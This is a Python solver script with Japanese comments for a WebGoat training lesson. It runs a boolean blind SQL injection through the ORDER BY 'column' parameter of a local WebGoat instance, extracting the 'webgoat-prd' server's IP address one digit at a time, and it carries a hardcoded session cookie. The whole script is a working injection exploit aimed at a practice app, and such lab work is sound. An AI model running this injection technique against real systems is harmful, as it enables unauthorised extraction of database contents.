import json
import requests
import urllib

###
#SQL injection (mitigation) lesson 12
#F12のnetworkタブからgetメソッドの通信を閲覧、編集して再送信を行い、URLパラメータにcase when (substring((select ip from servers where hostname='webgoat-prd'),1,1)=1) then id else hostname endで
#Blind SQLとORDERの特性をを応用した攻撃が通る
#sniper_2_adv.py にて完全なIPアドレスが取得できるようなコードが実装済み
###

def sql_injection_adv_5():

    index=1
    numbers='0123456789'
    numbers_num=0
    result=''
    
    #substringは第2引数nとおくとn文字目を意味する。index0番目は1文字目として扱われるらしい?
    passwd =''

    headers={
        'Cookie': 'JSESSIONID=O6tg2QHoX_AKTTZuF4M-1vyjOouTBFZc3V-uksMv'
        # 'Cookie': 'JSESSIONID=hrY1H16D4yk_NqheEs2CgzBaNX8tQ-3wL8dICOjQ' 
        # Example here ^
    }
    #インスペクターなどを使用しクッキーの数値を取得し貼り付けること
    #下のrequests.put()内で指定するURLと対応するCOOKIEのJSESSIONID

    while True:
        if index >= 4:
            print('result='+str(result))
            return
        
        url='http://127.0.0.1:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when+(substring((select+ip+from+servers+where+hostname%3d\'webgoat-prd\'),{},1)%3d{})+then+id+else+hostname+end'.format(index,numbers[numbers_num])
        print(url)
        r= requests.get(url,headers=headers)
        try:
            response =json.loads(r.text)
            
        except:
            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
            return

        for i in range(4):
            print(i)
            if response[i]['id'] == str(i+1):
                print('FOUND')   
            else:
                numbers_num+=1 
                break
            if i == 3:
                print(numbers[numbers_num])
                result= result+numbers[numbers_num]
                numbers_num=0
                index+=1
        
                  

sql_injection_adv_5()

		
